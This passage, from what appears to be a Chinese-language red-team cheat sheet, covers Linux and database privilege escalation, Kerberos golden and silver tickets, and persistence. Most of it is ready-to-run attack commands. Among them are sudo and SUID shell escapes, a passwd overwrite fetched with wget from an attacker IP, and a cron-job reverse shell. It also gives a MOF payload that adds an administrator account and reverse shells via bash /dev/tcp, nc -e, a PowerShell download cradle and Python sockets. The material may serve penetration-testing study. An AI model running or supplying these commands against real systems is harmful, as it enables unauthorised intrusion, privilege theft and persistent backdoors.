+<p>使用searchsploit在kali 查找相关内核漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">searchsploit -t Ubuntu 14.04
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<h4 id="2sudo提权" class="headerLink">
+    <a href="#2sudo%e6%8f%90%e6%9d%83" class="header-mark"></a>1.2.2 2.sudo提权</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo --version  //查看版本
+</span></span><span class="line"><span class="cl">sudo -l     //查看当前用户可以使用的sudo的命令程序
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权）</p>
+<p>利用find:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo find . -exec /bin/sh \; -quit或者sudo awk &#39;BEGIN {system(&#34;/bin/sh&#34;)}&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>python命令提权(su root被禁止登录，python获取交互shell)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其他漏洞CVE-2019-14287、CVE-2021-3156</p>
+<h4 id="3suid提权" class="headerLink">
+    <a href="#3suid%e6%8f%90%e6%9d%83" class="header-mark"></a>1.2.3 3.suid提权</h4><p>① 查找具有suid权限文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find / -user root -perm -4000 -print 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">find / -perm -u=s -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">find / -user root -perm -4000 -exec ls -ldb {} \;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find filename -exec whoami \;    //以SUID即root权限执行命令
+</span></span><span class="line"><span class="cl">如果是/usr/bin/bash执行bash -p     //将以root权限打开一个bash shell
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nmap -v   //查看版本
+</span></span><span class="line"><span class="cl">root@localhost:~# nmap --interactive //交互模式
+</span></span><span class="line"><span class="cl">nmap&gt; !sh
+</span></span><span class="line"><span class="cl">root@localhost:~# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>③ vim
+Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vim.tiny /etc/shadow   //读取文件
+</span></span><span class="line"><span class="cl">vim来打开shell
+</span></span><span class="line"><span class="cl">vim.tiny
+</span></span><span class="line"><span class="cl"># Press ESC key
+</span></span><span class="line"><span class="cl">:set shell=/bin/sh
+</span></span><span class="line"><span class="cl">:shell
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="4su" class="headerLink">
+    <a href="#4su" class="header-mark"></a>1.2.4 4.su</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo su - #使用root用户登录，不用输入root密码即可切换
+</span></span><span class="line"><span class="cl">​
+</span></span><span class="line"><span class="cl">利用python获取交互Shell
+</span></span><span class="line"><span class="cl">python -c &#39;import pty;pty.spawn(&#34;/bin/sh&#34;)&#39;
+</span></span><span class="line"><span class="cl">sudo su
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="5任务计划" class="headerLink">
+    <a href="#5%e4%bb%bb%e5%8a%a1%e8%ae%a1%e5%88%92" class="header-mark"></a>1.2.5 5.任务计划</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ls -l /etc/cron*
+</span></span><span class="line"><span class="cl">cat /etc/crontab
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升；
+如权限配置不当777的执行脚本，则可以修改脚本内容进行提权；</p>
+<h4 id="6覆盖passwd提权" class="headerLink">
+    <a href="#6%e8%a6%86%e7%9b%96passwd%e6%8f%90%e6%9d%83" class="header-mark"></a>1.2.6 6.覆盖passwd提权</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">通过OpenSSL passwd生成一个新的用户hacker，密码为hack123
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">openssl passwd -1 -salt hacker 123456
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$1$hacker$6luIRwdGpBvXdP.GMwcZp/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">wget http://192.168.18.7/passwd -O /etc/passwd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">然后在反弹shell中切换用户，或者使用ssh登录都可以
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="7ssh密钥提权" class="headerLink">
+    <a href="#7ssh%e5%af%86%e9%92%a5%e6%8f%90%e6%9d%83" class="header-mark"></a>1.2.7 7.ssh密钥提权</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat /etc/passwd | grep bash #查找bash的用户
+</span></span><span class="line"><span class="cl">用MD5校验，authorized_keys id_rsa 为同一个文件
+</span></span><span class="line"><span class="cl">跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录
+</span></span><span class="line"><span class="cl">假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="8john破解shadow-root密文登陆提权" class="headerLink">
+    <a href="#8john%e7%a0%b4%e8%a7%a3shadow-root%e5%af%86%e6%96%87%e7%99%bb%e9%99%86%e6%8f%90%e6%9d%83" class="header-mark"></a>1.2.8 8.john破解shadow root密文登陆提权</h4><p>john会自动检测密文类型 &ndash;wordlist 字段文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">john --wordlist=&#34;/usr/share/wordlists/rockyou.txt&#34; userpassw
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717154906354.png" title="image-20230717154906354" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717154906354.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717154906354.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717154906354.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717154906354.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717154906354.png 2x"
+            sizes="auto"
+            alt="image-20230717154906354">
+    </a></figure></p>
+<h4 id="9ubuntu计划任务反弹shell提权" class="headerLink">
+    <a href="#9ubuntu%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1%e5%8f%8d%e5%bc%b9shell%e6%8f%90%e6%9d%83" class="header-mark"></a>1.2.9 9.Ubuntu计划任务反弹shell提权</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span>  <span class="c1">#查看计划任务</span>
+</span></span><span class="line"><span class="cl"><span class="n">crontab</span> <span class="o">-</span><span class="n">l</span>   <span class="c1">#查看当前用户的计划任务</span>
+</span></span><span class="line"><span class="cl"><span class="n">ls</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">cron</span><span class="o">/</span><span class="n">crontabs</span><span class="o">/</span><span class="n">root</span> <span class="c1">#root任务文件目录 </span>
+</span></span><span class="line"><span class="cl"><span class="err">默认情况下非</span><span class="n">root权限不可见</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">tail</span> <span class="o">-</span><span class="n">f</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">syslog</span>
+</span></span><span class="line"><span class="cl"><span class="err">通过</span><span class="n">syslog</span> <span class="err">查看日志，发现</span><span class="n">cleanup</span><span class="o">.</span><span class="n">py文件每分钟会以root权限运行一次</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155211815.png" title="image-20230717155211815" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155211815.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155211815.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155211815.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155211815.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155211815.png 2x"
+            sizes="auto"
+            alt="image-20230717155211815">
+    </a></figure></p>
+<p>发现当前用户可以修改cleanup.py文件</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155319351.png" title="image-20230717155319351" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155319351.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155319351.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155319351.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155319351.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155319351.png 2x"
+            sizes="auto"
+            alt="image-20230717155319351">
+    </a></figure></p>
+<p>尝试修改计划任务进行反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bash -i &gt;&amp; /dev/tcp/192.168.18.7/7777 &gt;&amp;1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155442919.png" title="image-20230717155442919" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155442919.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155442919.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155442919.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155442919.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155442919.png 2x"
+            sizes="auto"
+            alt="image-20230717155442919">
+    </a></figure></p>
+<h3 id="数据库提权" class="headerLink">
+    <a href="#%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83" class="header-mark"></a>1.3 数据库提权</h3><h4 id="1mof提权" class="headerLink">
+    <a href="#1mof%e6%8f%90%e6%9d%83" class="header-mark"></a>1.3.1 1.MOF提权</h4><p>MySQL数据库，Windows&lt;=2003</p>
+<p>MOF文件既然每五秒就会执行，而且是系统权限；</p>
+<p>我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件；</p>
+<p>然后系统每隔五秒就会执行一次我们上传的MOF。</p>
+<p>MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#pragma namespace(&#34;\\\\.\\root\\subscription&#34;) </span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="n">of</span> <span class="n">__EventFilter</span> <span class="n">as</span> <span class="o">$</span><span class="n">EventFilter</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">EventNamespace</span> <span class="o">=</span> <span class="s2">&#34;Root</span><span class="se">\\</span><span class="s2">Cimv2&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">Name</span>  <span class="o">=</span> <span class="s2">&#34;filtP2&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">Query</span> <span class="o">=</span> <span class="s2">&#34;Select * From __InstanceModificationEvent &#34;</span> 
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Where TargetInstance Isa </span><span class="se">\&#34;</span><span class="s2">Win32_LocalTime</span><span class="se">\&#34;</span><span class="s2"> &#34;</span> 
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;And TargetInstance.Second = 5&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">QueryLanguage</span> <span class="o">=</span> <span class="s2">&#34;WQL&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">};</span> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="n">of</span> <span class="n">ActiveScriptEventConsumer</span> <span class="n">as</span> <span class="o">$</span><span class="n">Consumer</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">Name</span> <span class="o">=</span> <span class="s2">&#34;consPCSV2&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">ScriptingEngine</span> <span class="o">=</span> <span class="s2">&#34;JScript&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">ScriptText</span> <span class="o">=</span> 
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;var WSH = new ActiveXObject(</span><span class="se">\&#34;</span><span class="s2">WScript.Shell</span><span class="se">\&#34;</span><span class="s2">)</span><span class="se">\n</span><span class="s2">WSH.run(</span><span class="se">\&#34;</span><span class="s2">net.exe user hacker P@ssw0rd /add</span><span class="se">\&#34;</span><span class="s2">)</span><span class="se">\n</span><span class="s2">WSH.run(</span><span class="se">\&#34;</span><span class="s2">net.exe localgroup administrators hacker /add</span><span class="se">\&#34;</span><span class="s2">)&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">};</span> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="n">of</span> <span class="n">__FilterToConsumerBinding</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">Consumer</span>   <span class="o">=</span> <span class="o">$</span><span class="n">Consumer</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">Filter</span> <span class="o">=</span> <span class="o">$</span><span class="n">EventFilter</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>（通常使用msf自带的mof模块来实现提权）</p>
+<h4 id="2udf提权" class="headerLink">
+    <a href="#2udf%e6%8f%90%e6%9d%83" class="header-mark"></a>1.3.2 2.UDF提权</h4><p>UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限</p>
+<p><a href="https://blog.csdn.net/qq_43430261/article/details/107258466" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/qq_43430261/article/details/107258466</a></p>
+<h4 id="3mssql提权" class="headerLink">
+    <a href="#3mssql%e6%8f%90%e6%9d%83" class="header-mark"></a>1.3.3 3.Mssql提权</h4><p>mssql提权主要分为<strong>弱口令</strong>与<strong>溢出</strong>两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。</p>
+<p>通过漏洞拉到webshell之后，找到网站配置文件，里面有sa权限的账号密码，配置文件为asp或者aspx网站一般使用微软自带数据库，这个提权没有sa权限是不能做的
+mssql一般是允许远程连接的
+系统库是master</p>
+<h2 id="白银票据和黄金票据" class="headerLink">
+    <a href="#%e7%99%bd%e9%93%b6%e7%a5%a8%e6%8d%ae%e5%92%8c%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae" class="header-mark"></a>2 白银票据和黄金票据</h2><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717170328370.png" title="image-20230717170328370" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717170328370.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717170328370.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717170328370.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717170328370.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717170328370.png 2x"
+            sizes="auto"
+            alt="image-20230717170328370">
+    </a></figure></p>
+<p><a href="https://www.ctfiot.com/74435.html" target="_blank" rel="noopener noreferrer">九维团队-红队（突破）| 黄金白银票据攻击与防御 | CTF导航 (ctfiot.com)</a></p>
+<p><a href="https://www.cnblogs.com/1-Ry/p/15418602.html" target="_blank" rel="noopener noreferrer">黄金票据、白银票据 - 1_Ry - 博客园 (cnblogs.com)</a></p>
+<h3 id="kerberos认证流程" class="headerLink">
+    <a href="#kerberos%e8%ae%a4%e8%af%81%e6%b5%81%e7%a8%8b" class="header-mark"></a>2.1 Kerberos认证流程</h3><p>Client 与 AS 的交互,</p>
+<p>Client 与 TGS 的交互,
+Client 与 Server 的交互。</p>
+<p>黄金票据是伪造TGT，白银票据则是伪造ST</p>
+<h3 id="黄金票据" class="headerLink">
+    <a href="#%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae" class="header-mark"></a>2.2 黄金票据</h3><p>在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个
+Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p>
+<p><strong>所需条件:</strong></p>
+<p>1、域名称</p>
+<p>2、域的SID值(用户的sid值去掉最后一个杠的数字就是域sid值)</p>
+<p>3、域的KRBTGT账号的HASH</p>
+<p>4、伪造任意用户名</p>
+<p>（获取域的SID和KRBTGT账号的NTLM HASH的前提是需要已经拿到了域的权限）</p>
+<h3 id="白银票据" class="headerLink">
+    <a href="#%e7%99%bd%e9%93%b6%e7%a5%a8%e6%8d%ae" class="header-mark"></a>2.3 白银票据</h3><p>白银票据就是伪造的ST。
+在Kerberos认证的第三部，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。
+所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作</p>
+<p><strong>所需条件:</strong></p>
+<p>1.域名
+2.域sid
+3.目标服务器名
+4.可利用的服务
+5.服务账号的NTML HASH
+6.需要伪造的用户名</p>
+<h3 id="不同点" class="headerLink">
+    <a href="#%e4%b8%8d%e5%90%8c%e7%82%b9" class="header-mark"></a>2.4 不同点</h3><h4 id="获取的权限不同" class="headerLink">
+    <a href="#%e8%8e%b7%e5%8f%96%e7%9a%84%e6%9d%83%e9%99%90%e4%b8%8d%e5%90%8c" class="header-mark"></a>2.4.1 <strong>获取的权限不同</strong>:</h4><p>金票：伪造的TGT，可以获取任意Kerberos的访问权限
+银票：伪造的ST，只能访问指定的服务，如CIFS</p>
+<h4 id="认证流程不同" class="headerLink">
+    <a href="#%e8%ae%a4%e8%af%81%e6%b5%81%e7%a8%8b%e4%b8%8d%e5%90%8c" class="header-mark"></a>2.4.2 <strong>认证流程不同</strong></h4><p>金票：同KDC交互，但不同AS交互
+银票：不同KDC交互，直接访问Server</p>
+<h4 id="加密方式不同" class="headerLink">
+    <a href="#%e5%8a%a0%e5%af%86%e6%96%b9%e5%bc%8f%e4%b8%8d%e5%90%8c" class="header-mark"></a>2.4.3 <strong>加密方式不同</strong></h4><p>金票：由krbtgt NTLM Hash 加密
+银票：由服务账号 NTLM Hash 加密</p>
+<h2 id="权限维持" class="headerLink">
+    <a href="#%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81" class="header-mark"></a>3 权限维持</h2><h4 id="1反弹shell" class="headerLink">
+    <a href="#1%e5%8f%8d%e5%bc%b9shell" class="header-mark"></a>3.0.4 1.反弹shell</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">nc</span>
+</span></span><span class="line"><span class="cl"><span class="n">attackhost</span><span class="p">:</span><span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">9999</span>
+</span></span><span class="line"><span class="cl"><span class="n">target</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&amp;&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">0.198</span><span class="o">/</span><span class="mi">9999</span> <span class="o">&lt;&amp;</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">netcat</span>
+</span></span><span class="line"><span class="cl"><span class="n">nc</span> <span class="o">-</span><span class="n">e</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.198</span> <span class="mi">9999</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">powershell</span>
+</span></span><span class="line"><span class="cl"><span class="err">将</span><span class="n">ps1放到attackhost上</span>
+</span></span><span class="line"><span class="cl"><span class="n">powershell</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">exec</span> <span class="n">bypass</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.1/Backdoor.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">python</span>
+</span></span><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.0.1&#34;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="2webshell" class="headerLink">
+    <a href="#2webshell" class="header-mark"></a>3.0.5 2.webshell</h4><p>① 内存马隐藏
+② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合</p>
+<h4 id="3系统后门" class="headerLink">
